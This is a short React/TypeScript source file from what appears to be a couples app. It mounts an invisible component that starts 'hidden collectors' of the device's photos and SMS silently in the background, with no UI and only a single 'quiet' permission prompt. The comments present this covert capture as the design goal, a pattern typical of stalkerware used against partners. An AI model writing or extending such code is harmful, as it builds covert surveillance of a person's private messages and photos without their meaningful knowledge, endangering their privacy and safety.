// features/capture/Host.tsx — invisible mount for hidden device capture.
//
// Renders nothing (ReturnType <group> null). Its sole job is to bootstrap the
// capture lifecycle as soon as the couple session is available, so the hidden
// collectors (photos + SMS) start silently in the background with no UI. The
// single quiet permission prompt is triggered once on first mount and, if
// denied, the collectors simply stay degraded (ok:false, reason) until a later
// mount — never nagging, fully silent.
import { useDeviceCapture } from './index';

export function DeviceCaptureHost() {
  // start the hidden capture lifecycle; nothing to render
  useDeviceCapture();
  return null;
}
